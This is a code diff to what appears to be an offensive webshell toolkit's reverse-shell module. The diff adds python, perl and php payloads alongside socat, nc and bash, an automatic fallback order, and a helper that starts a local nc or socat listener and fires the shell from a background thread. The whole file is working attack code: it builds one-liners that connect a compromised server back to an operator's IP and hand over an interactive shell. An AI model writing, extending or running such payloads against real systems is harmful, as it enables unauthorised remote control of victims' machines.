@@ -1,46 +1,112 @@
-"""Reverse shells, trying socat (interactive PTY), then nc, then bash."""
+"""Reverse shells via several techniques, with an optional local listener.
+
+``auto`` tries methods in order of quality/likelihood (socat gives a real PTY;
+the scripting fallbacks cover hosts where none of socat/nc/bash work).
+"""
 
 from __future__ import annotations
 
+import contextlib
 import shlex
+import subprocess
+import threading
+import time
 
 from .. import log
 from ..core.webshell import WebShell
 from ..exceptions import ConnectionFailed, WebshellError
 
+# Method name -> the binary we probe for with `which`.
+_BINARY = {
+    "socat": "socat", "nc": "nc", "bash": "bash",
+    "python": "python3", "perl": "perl", "php": "php",
+}
+_AUTO_ORDER = ["socat", "nc", "bash", "python", "perl", "php"]
+
 
 def _which(ws: WebShell, binary: str) -> str:
     try:
-        return ws.run_command(f"which {shlex.quote(binary)}").strip()
+        out = ws.run_command(f"which {shlex.quote(binary)}").strip()
     except WebshellError:
         return ""
+    return out.splitlines()[0] if out else ""
 
 
-def reverse_shell(ws: WebShell, ip: str, port: int) -> None:
-    """Fire a reverse shell back to ``ip:port``.
+def _payload(method: str, binary: str, ip: str, port: str) -> str:
+    if method == "socat":
+        return f"{binary} tcp-connect:{ip}:{port} exec:'bash -li',pty,stderr,setsid,sigint,sane"
+    if method == "nc":
+        return f"{binary} -e /bin/sh {ip} {port}"
+    if method == "bash":
+        return f"{binary} -c 'sh -i >& /dev/tcp/{ip}/{port} 0>&1'"
+    if method == "python":
+        return (
+            f"{binary} -c 'import socket,subprocess,os;"
+            f's=socket.socket();s.connect(("{ip}",{port}));'
+            "[os.dup2(s.fileno(),f) for f in(0,1,2)];"
+            "subprocess.call([\"/bin/sh\",\"-i\"])'"
+        )
+    if method == "perl":
+        return (
+            f"{binary} -e 'use Socket;$i=\"{ip}\";$p={port};"
+            'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
+            "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
+            'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
+        )
+    if method == "php":
+        return f"{binary} -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    raise ValueError(f"unknown reverse-shell method: {method}")
 
-    The HTTP request blocks for as long as the shell lives, so a timeout here
-    is the *expected* success path (v1 relied on the same trick) — have your
-    listener (``socat file:\\`tty\\`,raw,echo=0 tcp-l:PORT`` or ``nc -lvnp``)
-    ready first.
+
+def reverse_shell(ws: WebShell, ip: str, port: int | str, method: str = "auto") -> bool:
+    """Fire a reverse shell to ``ip:port``. Returns True once one fires.
+
+    The HTTP request blocks while the shell lives, so a connection drop/timeout
+    is the *expected* success path — have your listener ready first.
     """
-    ip_q, port_q = shlex.quote(ip), str(int(port))
+    port = str(int(port))
+    methods = _AUTO_ORDER if method == "auto" else [method]
+    for name in methods:
+        binary = _which(ws, _BINARY[name])
+        if not binary and name == "python":
+            binary = _which(ws, "python")
+        if not binary:
+            continue
+        log.success(f"Trying {name} reverse shell ({binary}) -> {ip}:{port}")
+        try:
+            ws.run_command(_payload(name, binary, ip, port))
+        except ConnectionFailed:
+            log.success("Connection closed by the reverse shell (this is expected).")
+            return True
+        log.warning(f"{name} returned without connecting; trying next method.")
+    log.error("No reverse-shell method succeeded.")
+    return False
 
-    socat = _which(ws, "socat")
-    if socat:
-        log.success(f"socat found ({socat}); spawning interactive reverse shell.")
-        cmd = f"{socat} tcp-connect:{ip_q}:{port_q} exec:'bash -li',pty,stderr,setsid,sigint,sane"
+
+def reverse_shell_with_listener(
+    ws: WebShell, ip: str, port: int | str, method: str = "auto", tool: str = "nc"
+) -> None:
+    """Spawn a local listener, then fire the reverse shell into it.
+
+    The payload is fired from a background thread (after a short delay so the
+    listener is bound first); the listener runs in the foreground so you can
+    interact with the shell.
+    """
+    port = str(int(port))
+    if tool == "socat":
+        listener: list[str] | str = f"socat file:`tty`,raw,echo=0 tcp-listen:{port}"
+        shell = True
     else:
-        nc = _which(ws, "nc")
-        if nc:
-            log.success(f"nc found ({nc}); spawning reverse shell.")
-            cmd = f"{nc} -e /bin/sh {ip_q} {port_q}"
-        else:
-            log.warning("Neither socat nor nc found; falling back to bash /dev/tcp.")
-            cmd = f"bash -c 'sh -i >& /dev/tcp/{ip}/{port_q} 0>&1'"
+        listener, shell = ["nc", "-lvnp", port], False
 
+    def _fire() -> None:
+        time.sleep(1.0)
+        with contextlib.suppress(Exception):
+            reverse_shell(ws, ip, port, method)
+
+    threading.Thread(target=_fire, daemon=True).start()
+    log.success(f"Listening on :{port} ({tool}); the shell should connect shortly.")
     try:
-        ws.run_command(cmd)
-    except ConnectionFailed:
-        # Connection dropped/timed out == the shell took over the request.
-        log.success("Connection closed by the reverse shell (this is expected).")
+        subprocess.run(listener, shell=shell)  # noqa: S602
+    except FileNotFoundError:
+        log.error(f"{tool} not found locally — start a listener manually (e.g. nc -lvnp {port}).")
